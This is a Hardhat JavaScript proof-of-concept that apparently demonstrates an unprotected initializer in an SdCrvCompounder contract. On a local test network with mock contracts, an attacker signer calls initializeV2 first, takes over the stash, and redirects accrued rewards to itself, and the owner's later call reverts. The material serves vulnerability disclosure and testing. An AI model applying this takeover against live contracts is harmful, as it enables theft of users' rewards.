// SdCrvCompounder.initializeV2 (L1318) has no access control beyond `stash == 0`: the first caller after the
// upgrade chooses the stash, and `_updateStash` (L1561-L1569) points the wrapper's reward receiver for the
// compounder at it.
const { ethers, expectRevert } = require("../lib");
const hre = require("hardhat");
async function main() {
  const [owner, attacker, anyone] = await ethers.getSigners();
  const tok = await ethers.deployContract("IRToken");
  const code = await ethers.provider.getCode(tok.target);
  for (const a of ["0xD533a949740bb3306d119CC777fa900bA034cd52", "0x7f50786A0b15723D741727882ee99a0BF34e3466",
    "0x478bBC744811eE8310B461514BDc29D03739084D", "0xD1b5651E55D4CeeD36251c61c50C889B36F6abB5"]) {
    await hre.network.provider.send("hardhat_setCode", [a, code]);
  }
  const wrapper = await ethers.deployContract("IRWrapper");
  const comp = await ethers.deployContract("SdCrvCompounder", [anyone.address, wrapper.target]);
  console.log(`s0 stash=${await comp.stash()} receiver(compounder)=${await wrapper.rewardReceiver(comp.target)}`);
  await (await comp.connect(attacker).initializeV2(attacker.address)).wait();
  console.log(`a1 attacker.initializeV2(attacker) -> stash=${await comp.stash()} receiver(compounder)=${await wrapper.rewardReceiver(comp.target)} (attacker=${attacker.address})`);
  console.log("a2", await expectRevert(comp.connect(owner).initializeV2(owner.address), "owner.initializeV2(intended stash)"));
  await (await wrapper.accrue(comp.target, 123n * 10n ** 18n)).wait();
  const [to, amt] = await wrapper.connect(anyone).claim.staticCall(comp.target);
  console.log(`a3 anyone.claim(compounder) pays ${amt} to ${to} (attacker? ${to === attacker.address})`);
}
main().catch((e) => { console.error(e); process.exit(1); });
